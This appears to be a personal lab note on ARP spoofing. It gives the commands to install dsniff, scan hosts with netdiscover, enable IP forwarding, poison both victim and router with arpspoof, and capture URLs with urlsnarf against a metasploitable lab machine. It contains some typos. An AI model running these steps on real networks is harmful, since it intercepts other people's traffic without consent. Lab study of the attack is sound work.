# Performing the ARP attack
`dsniff` and `arpspoof` are tools used to perform the ARP spoofing attack the `arspoof` to execute the attack and `dsniff` to intercept network traffic. 

``` Shell-script
sudo apt-get install dsniff
```

-  However before doing this we must first discover the IP address of other machines
- To do this we must use a tool called `netdiscover`

``` Shell-script
sudo netdiscover
```

Net Discovers by scanning all of the devices on the network using ARP Queries and scans all possible IP's on the subnetwork

- This scan will also display the MAC of the device as well as the manufacturer of the MAC address it self 

Then we would need to enable IP forwarding with the following command 

``` Shell-script
echo 1 > /proc/sys/net/ipv4/ip_forward
```


Syntax for generating fake ARP reply 

```
arpspoof -i eth0 -t <victim_ip> <router_ip>
```

- `-i`  the interface the nic supports in this case its ethernet but if we were doing this on a WiFi would state wlan  `-t` specifies the target 
- Now we must trick the router that we are the victims IP we can do so with the inverse command of the prevous one 

```Shell-script 
arspoof -i eth0 -t <router_ip> <victim_ip>
```

- its just inversed 
- Now that we have intercepted the Packets we can now get the URLs from these packets 

we can do so with the following command 

``` shell-script
urlsnarf -i eth0
```

- For the challenge we can use the metasploitable server we made to wget a url from google and with the prevouse command we can see this happen and we can see each time it goes into the internet 

After all the malicous attacks have been peroformed we must do ctrl c to stop the process 


Cool thing we can make a [[Python]] script to detect the arp spoofing so that it could let us know about the spoofing happening on our machine however we can use **HTTPS everywhere** which is a plugin that does same thing essentially. 


[[Exercises]]